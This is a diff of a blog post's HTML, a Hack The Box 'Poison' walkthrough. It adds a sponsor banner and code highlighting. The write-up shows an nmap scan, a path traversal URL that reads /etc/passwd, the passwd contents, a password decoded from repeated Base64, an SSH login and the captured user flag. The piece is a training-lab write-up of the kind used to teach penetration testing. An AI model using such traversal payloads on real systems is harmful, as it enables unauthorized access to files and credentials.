@@ -68,47 +68,35 @@
         
       </div>
 
-      <article class="post-content">
-      
+      <div id="sponsor">
+	
+	
+		<a href="https://lastpass.com/f?6951486" target="_blank" rel="noopener">🔐 Store your passwords securely with LastPass Premium and get 1 month free! 🔐</a>
+	
+	<br>
+	<span class="about"><a href="https://danthesalmon.com/sponsors">About these ads</a></span>
+</div>
 
-<p><strong>Note:</strong> <em>If you are currently trying to get access to this box, I highly recommend you try it yourself first and only use this guide if you really are stuck.</em>
+      <article class="post-content">
+      <p><strong>Note:</strong> <em>If you are currently trying to get access to this box, I highly recommend you try it yourself first and only use this guide if you really are stuck.</em>
 <br />
 <br /></p>
-
 <h3 id="intro">Intro</h3>
-
 <p>Now that the Poison box is retired on hackthebox, we can talk publicly about how to gain access to this machine. While this machine was active, I only took the time to gain user access, not all the way to root. There are multiple ways to get access on Poison, but I&rsquo;m just showing the way I took which is one of the shortest routes to the user.</p>
-
 <h3 id="machine-overview">Machine Overview</h3>
-
 <p>All we know about this box initially is that it&rsquo;s running FreeBSD and that most users who have completed it rate it as relatively easy to exploit.</p>
-
-<p><img src="../images/poison-overview.png" alt="poison-overview" /></p>
-
+<p><img src="../images/poison-overview.png" alt="poison-overview"></p>
 <h3 id="steps">Steps</h3>
-
 <p>As with all pentests, we must start with recon. Let&rsquo;s start by port scanning the box.</p>
-
-<pre><code class="language-shell">nmap -sC -sV -oA hackthebox-poison 10.10.10.84
-</code></pre>
-
-<p>and the results show:</p>
-
-<p><img src="../images/poison-scan.png" alt="poison-scan" /></p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nmap -sC -sV -oA hackthebox-poison 10.10.10.84
+</code></pre></div><p>and the results show:</p>
+<p><img src="../images/poison-scan.png" alt="poison-scan"></p>
 <p>So we can see this box only has SSH and HTTP running. Let&rsquo;s see what&rsquo;s running on port 80.</p>
-
-<p><img src="../images/poison-home.png" alt="poison-home" /></p>
-
+<p><img src="../images/poison-home.png" alt="poison-home"></p>
 <p>Here there&rsquo;s a list of file names and a textbox. If we enter any of the filenames into the text box, the page seems to read the contents of the file and output it to the screen. We&rsquo;re expected to input a file from the list of file names, but let&rsquo;s see what happens if we try to leave the current directory.</p>
-
 <p>In the browser, try to navigate to</p>
-
-<pre><code class="language-json">http://10.10.10.84/browse.php?file=../../../../../../../../../etc/passwd
-</code></pre>
-
-<p>and we should get the output</p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#ae81ff">10.10</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#ae81ff">10.84</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">b</span><span style="color:#960050;background-color:#1e0010">r</span><span style="color:#960050;background-color:#1e0010">o</span><span style="color:#960050;background-color:#1e0010">w</span><span style="color:#960050;background-color:#1e0010">s</span><span style="color:#960050;background-color:#1e0010">e</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">?</span><span style="color:#960050;background-color:#1e0010">f</span><span style="color:#960050;background-color:#1e0010">i</span><span style="color:#960050;background-color:#1e0010">l</span><span style="color:#960050;background-color:#1e0010">e</span><span style="color:#960050;background-color:#1e0010">=</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">e</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">c</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#960050;background-color:#1e0010">s</span><span style="color:#960050;background-color:#1e0010">s</span><span style="color:#960050;background-color:#1e0010">w</span><span style="color:#960050;background-color:#1e0010">d</span>
+</code></pre></div><p>and we should get the output</p>
 <pre><code># $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
 #
 root:*:0:0:Charlie &amp;:/root:/bin/csh
@@ -141,26 +129,16 @@ messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
 avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
 cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
 charix:*:1001:1001:charix:/home/charix:/bin/csh
-</code></pre>
-
-<p>Nice! The page is vulnerable to a <a href="https://www.owasp.org/index.php/Path_Traversal">Path Traversal attack</a>. In the output we can see that there are 2 users that have shell access on the box: <code>charix</code> and <code>root</code>.</p>
-
+</code></pre><p>Nice! The page is vulnerable to a <a href="https://www.owasp.org/index.php/Path_Traversal">Path Traversal attack</a>. In the output we can see that there are 2 users that have shell access on the box: <code>charix</code> and <code>root</code>.</p>
 <p>This is good information, but not enough to get access into the box. Let&rsquo;s circle back to the files listed on the home page</p>
-
 <pre><code>ini.php
 info.php
 listfiles.php
 phpinfo.php
-</code></pre>
-
-<p>Entering <code>listfiles.php</code> into the box on the home page lists the files we already know about, but also an unknown file with an interesting name - <code>pwdbackup.txt</code>.</p>
-
+</code></pre><p>Entering <code>listfiles.php</code> into the box on the home page lists the files we already know about, but also an unknown file with an interesting name - <code>pwdbackup.txt</code>.</p>
 <p>Well let&rsquo;s check that one out!</p>
-
-<pre><code class="language-json">http://10.10.10.84/browse.php?file=pwdbackup.txt
-</code></pre>
-
-<pre><code class="language-markdown">This password is secure, it's encoded atleast 13 times.. what could go wrong really..
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#ae81ff">10.10</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#ae81ff">10.84</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">b</span><span style="color:#960050;background-color:#1e0010">r</span><span style="color:#960050;background-color:#1e0010">o</span><span style="color:#960050;background-color:#1e0010">w</span><span style="color:#960050;background-color:#1e0010">s</span><span style="color:#960050;background-color:#1e0010">e</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">?</span><span style="color:#960050;background-color:#1e0010">f</span><span style="color:#960050;background-color:#1e0010">i</span><span style="color:#960050;background-color:#1e0010">l</span><span style="color:#960050;background-color:#1e0010">e</span><span style="color:#960050;background-color:#1e0010">=</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">w</span><span style="color:#960050;background-color:#1e0010">d</span><span style="color:#960050;background-color:#1e0010">b</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#960050;background-color:#1e0010">c</span><span style="color:#960050;background-color:#1e0010">k</span><span style="color:#960050;background-color:#1e0010">u</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">x</span><span style="color:#960050;background-color:#1e0010">t</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-markdown" data-lang="markdown">This password is secure, it&#39;s encoded atleast 13 times.. what could go wrong really..
 
 Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
 bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
@@ -178,25 +156,14 @@ Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
 WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
 VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
 Ukd4RVdub3dPVU5uUFQwSwo=
-</code></pre>
-
-<p>We can tell it&rsquo;s probably Base64 encoded based on the fact that it ends with an equal sign. Since the hint tells us it&rsquo;s encoded 13x, just run it through a Base64 decoder 13x. After all that we get:</p>
-
-<pre><code class="language-markdown">Charix!2#4%6&amp;8(0
-</code></pre>
-
-<p>Sure looks like a password to me! Verify this by SSH&rsquo;ing into the box with this password:</p>
-
+</code></pre></div><p>We can tell it&rsquo;s probably Base64 encoded based on the fact that it ends with an equal sign. Since the hint tells us it&rsquo;s encoded 13x, just run it through a Base64 decoder 13x. After all that we get:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-markdown" data-lang="markdown">Charix!2#4%6&amp;8(0
+</code></pre></div><p>Sure looks like a password to me! Verify this by SSH&rsquo;ing into the box with this password:</p>
 <pre><code>ssh charix@10.10.10.84
-</code></pre>
-
-<p>and of course grab the flag to claim</p>
-
+</code></pre><p>and of course grab the flag to claim</p>
 <pre><code>$ cat ~/user.txt
 eaacdfb2d141b72a589233063604209c
-</code></pre>
-
-<p>Root escalation will be left as an excercise to the reader (because I didn&rsquo;t have time to do it before the box was retired).</p>
+</code></pre><p>Root escalation will be left as an excercise to the reader (because I didn&rsquo;t have time to do it before the box was retired).</p>
 
       </article>
 
@@ -241,7 +208,7 @@ eaacdfb2d141b72a589233063604209c
 </nav>
 
           <small>
-            Copyright &#169; 2018<br>
+            Copyright &#169; 2019<br>
             Powered by <a href="http://gohugo.io/" target="_blank">Hugo</a> &amp; <a href="https://github.com/azmelanar/hugo-theme-pixyll" target="_blank">Pixyll</a>
           </small>
         </div>
